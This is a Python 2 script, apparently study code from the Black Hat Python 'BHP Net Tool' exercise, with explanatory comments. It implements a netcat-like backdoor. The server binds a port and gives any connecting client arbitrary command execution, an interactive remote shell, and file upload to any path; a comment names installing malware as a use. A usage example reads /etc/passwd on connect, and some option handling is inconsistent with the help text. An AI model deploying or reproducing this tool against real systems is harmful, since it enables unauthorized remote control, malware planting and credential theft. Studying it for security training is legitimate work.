#!/usr/bin/python

# import necessary libraries
import sys
import socket
import getopt
import threading
import subprocess

# define some global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


# handles command-line arguments and calling rest of our functions
def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen              - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run -execute the given fiel upon receiving a connection"
    print "-c --command             - initialize a command shell"
    print "-u --upload=destination  - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)


def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to our target host
        client.connect((target, port))

        # setup TCP socket object and then test to see if we received any input from stdin
        if len(buffer):
            client.send(buffer)
        while True:
            # now wait for data back
            recv_len = 1
            response = ""

            # if all is well, ship data to remote target and receive back
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print response,

            # wait for more input, and continue sending and receicing data until
            # the user kills the script
            buffer = raw_input("")
            buffer += "\n"

            # send it off
            client.send(buffer)

    except:

        print "[*] Exception! Exiting."

        # tear down the connection
        client.close()


# primary server loop is TCP server with threading
def server_loop():
    global target

    # if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    # AF_INET - we are going to use standard IPV4 address or hostname
    # SOCK_STREAM -  indicates that this will be a TCP client

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # spin off a thread
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


# run command function
# contains a new library called "subprocess". Subprocess provides a power process creation
# interface that gives you a number of ways to start and interact with client programs
def run_command(command):

    # trim the newline
    command = command.rstrip()

    # run the command and get the output back
    try:
        # we're simply running whatever command we pass in, running it on the local OS
        # and returning the output from the command back to the client that is connected
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)

    # this will catch generic errors and return back a message letting you know command failed
    except:
        output = "Failed to execute command.\r\n"

    # send the output back to the client
    return output


# implement the logic to do file uploads, command execution, and our shell
def client_handler(client_socket):
    global upload
    global execute
    global command

    # check for upload
    # determines if our tool is set to receive file when it receives a connection. This
    # can be useful for upload & execute exercises or for installing malware and having
    # the malware remove our Python callback
    if len(upload_destination):

        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        # We receive the file data in a loop to make sure we receive it all, and then we
        # simply open a file handle and write out the contents of the filE
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

# now we take these bytes and try to write them out
        # wb flag ensures that we are writing the file with binary mode enabled, which ensures
        # that uploading and writing a binary executable will be successful
        try:
                file_descriptor = open(upload_destination, "wb")
                file_descriptor.write(file_buffer)
                file_descriptor.close()

                # acknowledge that we wrote the file out
                client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
    # check for command execution. this calls our previously written run_command function and
    # sends results back across network
    if len(execute):
        # run the command
        output = run_command(execute)
        client_socket.send(output)

    # now we go into another loop if the command shell was requested
    # This bit of code handles our command shell; it continues to execute commands
    # as we send them in and sends back the output. You'll notice that it is scanning
    # for a newline character to determin when to process a command, which makes it
    # netcat friendly. If you are using a python client to speak to it remember to
    # add the newline character
    if command:

        while True:
            # show a simple prompt
            client_socket.send("<BHP:#> ")

            # now we receive until we see a linefeed
            # text had below line but not recognized by pyton ide
            # (enter key)

            # \n is the newline character
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # send back the command output
            response = run_command(cmd_buffer)

            # send back the response
            client_socket.send(response)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read in all of the command-lin options and set necessary variables depending on the options we detect.
    # if command line paramters don't match we print useful usage information
    try:
        opts, args = getopt.getopt(sys.argv[1:], "h:l:e:t:p:c:u:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
            print str(err)
            usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:

                # read the buffer from the commandline
                # this will, block so send CTRL-D if not sending input
                # to stdin
                buffer = sys.stdin.read()

                # send data off
                client_sender(buffer)

    # we are going to listen and potentially
    # upload things, execute commands and drop a shell back
    # depending on our command line options above
    if listen:
        server_loop()

main()
